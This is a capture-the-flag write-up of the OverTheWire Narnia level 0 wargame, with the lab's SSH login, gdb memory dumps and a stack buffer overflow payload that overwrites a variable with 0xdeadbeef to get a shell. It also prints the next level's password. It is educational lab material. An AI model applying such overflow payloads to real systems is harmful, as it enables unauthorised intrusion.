```sh
$ ssh -p 2226 narnia0@narnia.labs.overthewire.org
```

password: narnia

```
gdb-peda$ x/20wx 0x8048679
0x8048679:	0x73343225	0x66756200	0x7325203a	0x6176000a
0x8048689:	0x30203a6c	0x38302578	0x2f000a78	0x2f6e6962
0x8048699:	0x57006873	0x4f205941	0x21214646	0x01002121
0x80486a9:	0x283b031b	0x04000000	0xd8000000	0x44fffffc
0x80486b9:	0x55000000	0x68fffffe	0xf8000000	0x88fffffe
```

```
gdb-peda$ x/20wx 0x8048694
0x8048694:	0x6e69622f	0x0068732f -> /bin/sh
```

## バッファーオーバーフローによるローカル変数の上書き

```sh
$ (echo -e "AAAAAAAAAAAAAAAAAAAA\xef\xbe\xad\xde"; cat) |./narnia0
```

```sh
narnia0@narnia:/etc/narnia_pass$ (echo -e "AAAAAAAAAAAAAAAAAAAA\xef\xbe\xad\xde"; cat) | /narnia/narnia0
Correct val's value from 0x41414141 -> 0xdeadbeef!
Here is your chance: buf: AAAAAAAAAAAAAAAAAAAAﾭ�
val: 0xdeadbeef
ls
narnia0  narnia1  narnia2  narnia3  narnia4  narnia5  narnia6  narnia7	narnia8  narnia9
cat narnia1
efeidiedae
```
